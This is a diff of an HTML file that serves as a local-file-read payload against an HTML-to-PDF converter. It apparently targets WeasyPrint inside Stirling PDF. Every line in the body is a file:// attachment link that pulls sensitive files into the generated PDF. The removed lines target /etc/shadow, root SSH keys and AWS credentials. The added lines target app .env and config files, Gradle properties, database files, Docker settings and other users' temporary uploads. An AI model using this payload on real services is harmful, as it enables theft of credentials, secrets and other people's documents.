@@ -6,38 +6,39 @@
     <title>Document</title>
 </head>
 <body>
-    <link rel="attachment" href="file:///etc/passwd">
-    <!-- Critical system files -->
-<link rel="attachment" href="file:///etc/shadow">
-<link rel="attachment" href="file:///etc/group">
-<link rel="attachment" href="file:///etc/hosts">
-<link rel="attachment" href="file:///etc/hostname">
-<link rel="attachment" href="file:///etc/ssh/sshd_config">
-<link rel="attachment" href="file:///root/.ssh/id_rsa">
-<link rel="attachment" href="file:///root/.ssh/authorized_keys">
-<link rel="attachment" href="file:///root/.bash_history">
+<!-- Python/WeasyPrint specific -->
+<link rel="attachment" href="file:///usr/src/app/.bash_history">
+<link rel="attachment" href="file:///usr/src/app/app.py">
+<link rel="attachment" href="file:///usr/src/app/config.py">
+<link rel="attachment" href="file:///usr/src/app/settings.py">
+<link rel="attachment" href="file:///usr/src/app/.env">
+<link rel="attachment" href="file:///usr/src/app/requirements.txt">
 
-<!-- Application configuration -->
-<link rel="attachment" href="file:///etc/nginx/nginx.conf">
-<link rel="attachment" href="file:///etc/apache2/apache2.conf">
-<link rel="attachment" href="file:///var/www/html/.env">
-<link rel="attachment" href="file:///var/www/html/config.php">
+<!-- Stirling PDF application -->
+<link rel="attachment" href="file:///usr/src/app/src/main/resources/application.yml">
+<link rel="attachment" href="file:///usr/src/app/application.properties">
+<link rel="attachment" href="file:///configs/settings.yml">
 
-<!-- Database credentials -->
-<link rel="attachment" href="file:///etc/mysql/my.cnf">
-<link rel="attachment" href="file:///var/lib/mysql/mysql.sock">
+<!-- Gradle user files -->
+<link rel="attachment" href="file:///home/gradle/.bash_history">
+<link rel="attachment" href="file:///home/gradle/.gradle/gradle.properties">
 
-<!-- Logs -->
-<link rel="attachment" href="file:///var/log/auth.log">
-<link rel="attachment" href="file:///var/log/apache2/access.log">
-<link rel="attachment" href="file:///var/log/nginx/error.log">
+<!-- Temporary files (other users' uploads) -->
+<link rel="attachment" href="file:///tmp/output_6134215962817655206.pdf">
+<link rel="attachment" href="file:///tmp/">
 
-<!-- AWS/Cloud credentials -->
-<link rel="attachment" href="file:///root/.aws/credentials">
-<link rel="attachment" href="file:///root/.aws/config">
+<!-- WeasyPrint config -->
+<link rel="attachment" href="file:///etc/weasyprint/weasyprint.conf">
 
-<!-- Proc filesystem (may reveal running processes) -->
-<link rel="attachment" href="file:///proc/self/environ">
-<link rel="attachment" href="file:///proc/self/cmdline">
+<!-- Python site-packages (may contain hardcoded secrets) -->
+<link rel="attachment" href="file:///usr/local/lib/python3.11/site-packages/">
+
+<!-- Check for database files -->
+<link rel="attachment" href="file:///usr/src/app/database.db">
+<link rel="attachment" href="file:///usr/src/app/db.sqlite3">
+
+<!-- Docker environment -->
+<link rel="attachment" href="file:///.env">
+<link rel="attachment" href="file:///docker-compose.yml">
 </body>
 </html>
